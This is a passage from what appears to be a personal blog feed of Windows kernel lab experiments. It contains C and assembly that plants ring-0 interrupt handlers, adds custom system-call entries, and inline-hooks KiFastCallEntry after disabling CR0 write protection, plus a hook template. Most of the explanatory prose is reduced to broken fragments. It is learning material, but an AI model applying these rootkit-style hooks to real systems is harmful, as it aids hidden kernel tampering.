class="type">char</span>*)Address[AD_READ];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x40</span>; i++) &#123;</span><br><span class="line">        *des = ((<span class="type">char</span>*)ReadMem)[i];</span><br><span class="line">        des++;</span><br><span class="line">    &#125;</span><br><span class="line">    des = (<span class="type">char</span>*)Address[AD_ALLOC];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x40</span>; i++) &#123;</span><br><span class="line">        *des = ((<span class="type">char</span>*)AllocMem)[i];</span><br><span class="line">        des++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    ServiceTable[<span class="number">0</span>] = Address[AD_READ];</span><br><span class="line">    ServiceTable[<span class="number">1</span>] = Address[AD_ALLOC];</span><br><span class="line">    <span class="comment">//21SystemCallEntry</span></span><br><span class="line">    <span class="comment">//eq 8003f508 8003ee00`0008f120 </span></span><br><span class="line">    IdtAddress[<span class="number">0</span>] = <span class="number">0x0008f120</span>;</span><br><span class="line">    IdtAddress[<span class="number">1</span>] = <span class="number">0x8003ee00</span>;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        cli</span><br><span class="line">        push <span class="number">0x3B</span></span><br><span class="line">        pop fs</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __declspec(naked) SystemCallEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push <span class="number">0x30</span></span><br><span class="line">        pop fs</span><br><span class="line">        sti</span><br><span class="line">        <span class="comment">// () r0_ret_eip r3_cs r3_eflag r3_esp r3_ss</span></span><br><span class="line">        <span class="comment">//+0xcesp</span></span><br><span class="line">        mov ebx, ss: [esp + <span class="number">0xc</span>]</span><br><span class="line">        <span class="comment">//rdifastcall(linuxfastcallwindowsecxedx)</span></span><br><span class="line">        mov edi, ds: [ebx + <span class="number">4</span>]</span><br><span class="line">        <span class="comment">//eax</span></span><br><span class="line">        mov ebx, <span class="number">0x8003f270</span></span><br><span class="line">        mov edx, [ebx + eax * <span class="number">4</span>]</span><br><span class="line">        call edx</span><br><span class="line"></span><br><span class="line">        cli</span><br><span class="line">        push <span class="number">0x3b</span></span><br><span class="line">        pop fs</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __declspec(naked) ReadMem() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, ds: [edi]</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __declspec(naked) AllocMem() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push edi</span><br><span class="line">        push <span class="number">0</span></span><br><span class="line">        mov edx, <span class="number">0x80533708</span></span><br><span class="line">        <span class="comment">//ExAllocatePool = 0x80533708;</span></span><br><span class="line">        <span class="comment">//ExAllocatePoolstdcall</span></span><br><span class="line">        call edx</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != (DWORD)IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ntdll.exe</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line">DWORD __declspec(naked) ReadMem(DWORD address) &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,<span class="number">0</span><span class="comment">//</span></span><br><span class="line">        <span class="type">int</span> <span class="number">0x21</span></span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">DWORD __declspec(naked) AllocMem(DWORD size) &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, <span class="number">1</span><span class="comment">////</span></span><br><span class="line">        <span class="type">int</span> <span class="number">0x21</span></span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x\n&quot;</span>,ReadMem(<span class="number">0x8003f00c</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x&quot;</span>,AllocMem(<span class="number">0x10</span>));</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/31/Windows-Kernel-Experiment-system-call/image-20230531153550640.png" alt="image-20230531153550640"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows:InlineHook</title>
      <link href="/2023/05/29/Windows-Kernel-Experiment-InlineHook/"/>
      <url>/2023/05/29/Windows-Kernel-Experiment-InlineHook/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-InlineHook"><a href="#Windows-InlineHook" class="headerlink" title="Windows:InlineHook"></a>Windows:InlineHook</h1><p>hookhookExAllocatePool</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">dq @gdtr l100</span></span><br><span class="line">8003f000  00000000`00000000 00cf9b00`0000ffff</span><br><span class="line">8003f010  00cf9300`0000ffff 00cffb00`0000ffff</span><br><span class="line">8003f020  00cff300`0000ffff 80008b04`200020ab</span><br><span class="line">8003f030  ffc093df`f0000001 0040f300`00000fff</span><br><span class="line">......</span><br><span class="line">8003f110  f840933d`5400ffff 00000000`8003f120</span><br><span class="line">8003f120  00000000`8003f128 00000000`8003f130</span><br><span class="line">8003f130  00000000`8003f138 00000000`8003f140</span><br><span class="line">8003f140  00000000`8003f148 00000000`8003f150</span><br><span class="line">8003f150  00000000`8003f158 00000000`8003f160</span><br><span class="line">8003f160  00000000`8003f168 00000000`8003f170</span><br><span class="line">8003f170  00000000`8003f178 00000000`8003f180</span><br><span class="line">8003f180  00000000`8003f188 00000000`8003f190</span><br><span class="line">8003f190  00000000`8003f198 00000000`8003f1a0</span><br><span class="line">8003f1a0  00000000`8003f1a8 00000000`8003f1b0</span><br><span class="line">8003f1b0  00000000`8003f1b8 00000000`8003f1c0</span><br><span class="line">8003f1c0  00000000`8003f1c8 00000000`8003f1d0</span><br><span class="line">8003f1d0  00000000`8003f1d8 00000000`8003f1e0</span><br><span class="line">8003f1e0  00000000`8003f1e8 00000000`8003f1f0</span><br><span class="line">8003f1f0  00000000`8003f1f8 00000000`8003f200</span><br><span class="line">8003f200  00000000`8003f208 00000000`8003f210</span><br><span class="line">8003f210  00000000`8003f218 00000000`8003f220</span><br><span class="line">8003f220  00000000`8003f228 00000000`8003f230</span><br><span class="line">8003f230  00000000`8003f238 00000000`8003f240</span><br><span class="line">8003f240  00000000`8003f248 00000000`8003f250</span><br><span class="line">8003f250  00000000`8003f258 00000000`8003f260</span><br><span class="line">.........</span><br></pre></td></tr></table></figure><p>gdthook</p><p>hook_KiFastCallEntry30</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:80541510                               _KiFastCallEntry proc near              ; DATA XREF: KiLoadFastSyscallMachineSpecificRegisters(x)+24o</span><br><span class="line">.text:80541510</span><br><span class="line">.text:80541510 B9 23 00 00 00                mov     ecx, 23h ; &#x27;#&#x27;</span><br><span class="line">.text:80541515 6A 30                         push    30h ; &#x27;0&#x27;</span><br><span class="line">.text:80541517 0F A1                         pop     fs</span><br><span class="line">.text:80541519 8E D9                         mov     ds, ecx</span><br><span class="line">.text:8054151B 8E C1                         mov     es, ecx</span><br><span class="line">.text:8054151D 64 8B 0D 40 00 00 00          mov     ecx, large fs:40h</span><br><span class="line">.text:80541524 8B 61 04                      mov     esp, [ecx+4]</span><br><span class="line">.text:80541527 6A 23                         push    23h ; &#x27;#&#x27;</span><br><span class="line">.text:80541529 52                            push    edx</span><br><span class="line">.text:8054152A 9C                            pushf</span><br></pre></td></tr></table></figure><p>hook8054151Decxecxjmp(orz)</p><p>gdt8003f130</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">JmpTarget</span><span class="params">()</span>;</span><br><span class="line"><span class="type">char</span>* p = (<span class="type">char</span> *)<span class="number">0x8003f130</span>;</span><br><span class="line"><span class="type">size_t</span> i;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push <span class="number">0x30</span></span><br><span class="line">        pop fs</span><br><span class="line">        sti</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x30</span>; i++) &#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">//size_t i=0;edi</span></span><br><span class="line">        *p = ((<span class="type">char</span>*)JmpTarget)[i];</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        cli <span class="comment">//fsfs</span></span><br><span class="line">        push <span class="number">0x3B</span></span><br><span class="line">        pop fs</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __declspec(naked) JmpTarget() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov ecx, <span class="number">0x23</span></span><br><span class="line">        push <span class="number">0x30</span></span><br><span class="line">        pop fs</span><br><span class="line">        mov ds, cx</span><br><span class="line">        mov es, cx</span><br><span class="line">        mov ecx,<span class="number">0x8054151D</span></span><br><span class="line">        jmp ecx</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kd&gt; u 0x8003f130 l30</span><br><span class="line">8003f130 b923000000      mov     ecx,23h</span><br><span class="line">8003f135 6a30            push    30h</span><br><span class="line">8003f137 0fa1            pop     fs</span><br><span class="line">8003f139 668ed9          mov     ds,cx</span><br><span class="line">8003f13c 668ec1          mov     es,cx</span><br><span class="line">8003f13f b91d155480      mov     ecx,offset nt!KiFastCallEntry+0xd (8054151d)</span><br><span class="line">8003f144 ffe1            jmp     ecx</span><br></pre></td></tr></table></figure><p>80541510CR0[16] WPWrite Protect 10</p><p>&#x3D;8003f130-80541515&#x3D;FFAF DC1B</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, cr0</span><br><span class="line">        and eax, not <span class="number">0x10000</span></span><br><span class="line">        mov cr0, eax</span><br><span class="line"></span><br><span class="line">        <span class="comment">//E9 1B DC AF FF</span></span><br><span class="line">        mov al, <span class="number">0xe9</span></span><br><span class="line">        mov ds : [<span class="number">0x80541510</span>] , al</span><br><span class="line">        mov dword ptr ds : [<span class="number">0x80541511</span>],<span class="number">0xFFAFDC1B</span></span><br><span class="line"></span><br><span class="line">        mov eax, cr0</span><br><span class="line">        or eax, <span class="number">0x10000</span></span><br><span class="line">        mov cr0, eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>_KiFastCallEntry</p><p>cpu1cpu2</p></blockquote><p>ok</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">u 80541510</span></span><br><span class="line">nt!KiFastCallEntry:</span><br><span class="line">80541510 e91bdcafff      jmp     8003f130</span><br><span class="line">80541515 6a30            push    30h</span><br><span class="line">80541517 0fa1            pop     fs</span><br><span class="line">80541519 8ed9            mov     ds,cx</span><br><span class="line">8054151b 8ec1            mov     es,cx</span><br><span class="line">8054151d 648b0d40000000  mov     ecx,dword ptr fs:[40h]</span><br><span class="line">80541524 8b6104          mov     esp,dword ptr [ecx+4]</span><br><span class="line">80541527 6a23            push    23h</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">u 8003f130</span></span><br><span class="line">8003f130 b923000000      mov     ecx,23h</span><br><span class="line">8003f135 6a30            push    30h</span><br><span class="line">8003f137 0fa1            pop     fs</span><br><span class="line">8003f139 668ed9          mov     ds,cx</span><br><span class="line">8003f13c 668ec1          mov     es,cx</span><br><span class="line">8003f13f b91d155480      mov     ecx,offset nt!KiFastCallEntry+0xd (8054151d)</span><br><span class="line">8003f144 ffe1            jmp     ecx</span><br><span class="line">8003f146 cc              int     3</span><br></pre></td></tr></table></figure><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __declspec(naked) JmpTarget() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        pushad</span><br><span class="line">        pushfd</span><br><span class="line"> +++++your code++++++</span><br><span class="line">        popfd</span><br><span class="line">        popad</span><br><span class="line">        mov ecx, <span class="number">0x23</span></span><br><span class="line">        push <span class="number">0x30</span></span><br><span class="line">        pop fs</span><br><span class="line">        mov ds, cx</span><br><span class="line">        mov es, cx</span><br><span class="line">        mov ecx, <span class="number">0x8054151D</span></span><br><span class="line">        jmp ecx</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows:&amp;&amp;API</title>
      <link href="/2023/05/29/Windows-Kernel-Experiment-Open-interrupt-API-call/"/>
      <url>/2023/05/29/Windows-Kernel-Experiment-Open-interrupt-API-call/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows--amp-amp-API"><a href="#Windows--amp-amp-API" class="headerlink" title="Windows:&amp;&amp;API"></a>Windows:&amp;&amp;API</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>eflagsIF0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">    label:</span><br><span class="line">        jmp label</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        sti</span><br><span class="line">    label:</span><br><span class="line">        jmp label</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p></p><p>_KiFastCallEntryring3ring0</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">text:00469510                               _KiFastCallEntry proc near              ; DATA XREF: KiLoadFastSyscallMachineSpecificRegisters(x)+24o</span><br><span class="line">.text:00469510                                                                       ; _KiTrap01+74o</span><br><span class="line">.text:00469510</span><br><span class="line">.text:00469510                               var_B= byte ptr -0Bh</span><br><span class="line">.text:00469510</span><br><span class="line">.text:00469510                               ; FUNCTION CHUNK AT .text:004694DD SIZE 00000026 BYTES</span><br><span class="line">.text:00469510                               ; FUNCTION CHUNK AT .text:004697B0 SIZE 00000014 BYTES</span><br><span class="line">.text:00469510</span><br><span class="line">.text:00469510 B9 23 00 00 00                mov     ecx, 23h ; &#x27;#&#x27;</span><br><span class="line">.text:00469515 6A 30                         push    30h ; &#x27;0&#x27;</span><br><span class="line">.text:00469517 0F A1                         pop     fs</span><br><span class="line">.text:00469519 8E D9                         mov     ds, ecx</span><br><span class="line">.text:0046951B 8E C1                         mov     es, ecx</span><br><span class="line">.text:0046951D 64 8B 0D 40 00 00 00          mov     ecx, large fs:40h</span><br><span class="line">.text:00469524 8B 61 04                      mov     esp, [ecx+4]</span><br><span class="line">.text:00469527 6A 23                         push    23h ; &#x27;#&#x27;</span><br><span class="line">.text:00469529 52                            push    edx</span><br><span class="line">.text:0046952A 9C                            pushf</span><br></pre></td></tr></table></figure><p>fs,ds es </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00469515</span> <span class="number">6</span>A <span class="number">30</span>                         push    <span class="number">30</span>h ; <span class="string">&#x27;0&#x27;</span></span><br><span class="line">.text:<span class="number">00469517</span> <span class="number">0F</span> A1                         pop     fs</span><br></pre></td></tr></table></figure><p>fs(KPCR)30hKPCRCPUGDTIDT</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push <span class="number">0x30</span></span><br><span class="line">        pop fs</span><br><span class="line">        sti</span><br><span class="line">    label:</span><br><span class="line">        jmp label</span><br><span class="line">           push <span class="number">0x3B</span></span><br><span class="line">        pop fs</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><blockquote><p>3fs</p></blockquote><h3 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h3><p>KPCR</p><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><p>(fs)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">PVOID</span> <span class="params">(__stdcall *EX_AllOCATEPOOl)</span><span class="params">(DWORD PoolType, SIZE_T NumberOfBytes)</span>;</span><br><span class="line">PVOID g_pointer;</span><br><span class="line">EX_AllOCATEPOOl ExAllocatePool=(EX_AllOCATEPOOl)<span class="number">0x80536FEC</span>;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push <span class="number">0x30</span></span><br><span class="line">        pop fs</span><br><span class="line">        sti</span><br><span class="line">    &#125;</span><br><span class="line">    g_pointer=ExAllocatePool(<span class="number">0</span>,<span class="number">4096</span>);</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push <span class="number">0x3B</span></span><br><span class="line">        pop fs</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>, g_pointer);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ExAllocatePoolntkrnplpa,</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">PVOID <span class="title function_">ExAllocatePool</span><span class="params">(</span></span><br><span class="line"><span class="params">  _In_ POOL_TYPE PoolType,</span></span><br><span class="line"><span class="params">  _In_ SIZE_T    NumberOfBytes</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><ul><li><code>PoolType</code><code>NonPagedPool</code><code>PagedPool</code><code>NonPagedPool</code><code>PagedPool</code></li><li><code>NumberOfBytes</code></li></ul><p><img src="/2023/05/29/Windows-Kernel-Experiment-Open-interrupt-API-call/image-20230529210100412.png" alt="image-20230529210100412"></p><p><img src="/2023/05/29/Windows-Kernel-Experiment-Open-interrupt-API-call/image-20230529211226588.png" alt="image-20230529211226588"></p><p></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows:(Interrupt Handling)</title>
      <link href="/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/"/>
      <url>/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows--Interrupt-Handling"><a href="#Windows--Interrupt-Handling" class="headerlink" title="Windows:(Interrupt Handling)"></a>Windows:(Interrupt Handling)</h1><p><strong>!!!windbgr0</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">DWORD g_eax[<span class="number">2</span>], g_ebx[<span class="number">2</span>], g_ecx[<span class="number">2</span>], g_edx[<span class="number">2</span>], g_esi[<span class="number">2</span>], g_edi[<span class="number">2</span>], g_esp[<span class="number">2</span>], g_ebp[<span class="number">2</span>];</span><br><span class="line">WORD g_cs[<span class="number">2</span>], g_ds[<span class="number">2</span>], g_es[<span class="number">2</span>], g_fs[<span class="number">2</span>], g_gs[<span class="number">2</span>], g_ss[<span class="number">2</span>];</span><br><span class="line">DWORD g_eflags,g_eflags0;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        pushfd</span><br><span class="line">        pop[g_eflags]</span><br><span class="line">        mov[g_eax + <span class="number">4</span>], eax</span><br><span class="line">        mov[g_ebx + <span class="number">4</span>], ebx</span><br><span class="line">        mov[g_ecx + <span class="number">4</span>], ecx</span><br><span class="line">        mov[g_edx + <span class="number">4</span>], edx</span><br><span class="line">        mov[g_esi + <span class="number">4</span>], esi</span><br><span class="line">        mov[g_edi + <span class="number">4</span>], edi</span><br><span class="line">        mov[g_esp + <span class="number">4</span>], esp</span><br><span class="line">        mov[g_ebp + <span class="number">4</span>], ebp</span><br><span class="line">        mov[g_cs + <span class="number">2</span>], cs</span><br><span class="line">        mov[g_ds + <span class="number">2</span>], ds</span><br><span class="line">        mov[g_es + <span class="number">2</span>], es</span><br><span class="line">        mov[g_fs + <span class="number">2</span>], fs</span><br><span class="line">        mov[g_gs + <span class="number">2</span>], gs</span><br><span class="line">        mov[g_ss + <span class="number">2</span>], ss</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        pushfd</span><br><span class="line">        pop [g_eflags0]</span><br><span class="line">        mov[g_eax], eax</span><br><span class="line">        mov[g_ebx], ebx</span><br><span class="line">        mov[g_ecx], ecx</span><br><span class="line">        mov[g_edx], edx</span><br><span class="line">        mov[g_esi], esi</span><br><span class="line">        mov[g_edi], edi</span><br><span class="line">        mov[g_esp], esp</span><br><span class="line">        mov[g_ebp], ebp</span><br><span class="line">        mov[g_cs], cs</span><br><span class="line">        mov[g_ds], ds</span><br><span class="line">        mov[g_es], es</span><br><span class="line">        mov[g_fs], fs</span><br><span class="line">        mov[g_gs], gs</span><br><span class="line">        mov[g_ss], ss</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;eax:%x\t ebx:%x\t ecx:%x\t edx:%x\t esi:%x\t edi:%x\t esp:%x\t ebp:%x\t\n&quot;</span>,</span><br><span class="line">        g_eax[<span class="number">0</span>], g_ebx[<span class="number">0</span>], g_ecx[<span class="number">0</span>], g_edx[<span class="number">0</span>], g_esi[<span class="number">0</span>], g_edi[<span class="number">0</span>], g_esp[<span class="number">0</span>], g_ebp[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;eax:%x\t ebx:%x\t ecx:%x\t edx:%x\t esi:%x\t edi:%x\t esp:%x\t ebp:%x\t\n&quot;</span>,</span><br><span class="line">        g_eax[<span class="number">1</span>], g_ebx[<span class="number">1</span>], g_ecx[<span class="number">1</span>], g_edx[<span class="number">1</span>], g_esi[<span class="number">1</span>], g_edi[<span class="number">1</span>], g_esp[<span class="number">1</span>], g_ebp[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cs:%x\t ds:%x\t es:%x\t fs:%x\t gs:%x\t ss:%x\t\n&quot;</span>,</span><br><span class="line">        g_cs[<span class="number">0</span>], g_ds[<span class="number">0</span>], g_es[<span class="number">0</span>], g_fs[<span class="number">0</span>], g_gs[<span class="number">0</span>], g_ss[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cs:%x\t ds:%x\t es:%x\t fs:%x\t gs:%x\t ss:%x\t\n&quot;</span>,</span><br><span class="line">        g_cs[<span class="number">1</span>], g_ds[<span class="number">1</span>], g_es[<span class="number">1</span>], g_fs[<span class="number">1</span>], g_gs[<span class="number">1</span>], g_ss[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;efalgs0:0x%x\nefalgs0x%x&quot;</span>,g_eflags0,g_eflags);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">eax:<span class="number">401040</span>       